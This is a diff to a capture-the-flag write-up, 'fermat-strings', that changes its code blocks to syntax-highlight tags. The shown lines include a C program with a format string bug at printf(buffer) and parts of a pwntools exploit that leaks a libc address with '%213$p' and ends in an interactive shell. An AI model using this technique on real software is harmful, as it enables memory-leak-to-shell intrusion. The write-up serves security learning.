@@ -10,13 +10,12 @@ title: fermat-strings
     .
 </p>
 <p>The source code of the binary is as shown below.</p>
-{% raw %}
-<pre><code>
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;math.h&gt;
+{% highlight c %}
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <math.h>
 
 #define SIZE 0x100
 
@@ -55,7 +54,7 @@ int main(void)
   printf(buffer);
 
   int answer = -1;
-  for(int i = 0; i &lt; 100; i++) {
+  for(int i = 0; i < 100; i++) {
     if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
       answer = i;
     }
@@ -63,8 +62,7 @@ int main(void)
 
   if(answer != -1) printf("Found the answer: %d\n", answer);
 }
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 <p>
     As you can see in the source code, there is a format string bug at <code>printf(buffer)</code>.
     Running checksec I noticed that the program didn't have PIE enabled, meaning that the PIE base was fixed,
@@ -101,8 +99,7 @@ int main(void)
 </p>
 <img src="onegadgets.png" width="400px" height="auto">
 <p>The exploit code is as below.</p>
-{% raw %}
-<pre><code>
+{% highlight python %}
 #!/usr/bin/env python3
 from pwn import *
 
@@ -124,11 +121,11 @@ def ex():
     p.recvline()
 
     p.recvuntil(b"A: ")
-    p.send(b"1&lt;&gt;%213$p\x00")
+    p.send(b"1<>%213$p\x00")
     p.recvuntil(b"B: ")
     p.send(b"1\x00") 
 
-    p.recvuntil(b"&lt;&gt;")
+    p.recvuntil(b"<>")
     libc_base = int(p.recvuntil(b" and", drop=True), 16) - 0x270b3
     p.recvline()
     print(f"{libc_base=:x}")
@@ -166,5 +163,4 @@ def ex():
     p.interactive()
 
 if __name__ == "__main__": ex()
-</code></pre>
-{% endraw %}
+{% endhighlight %}
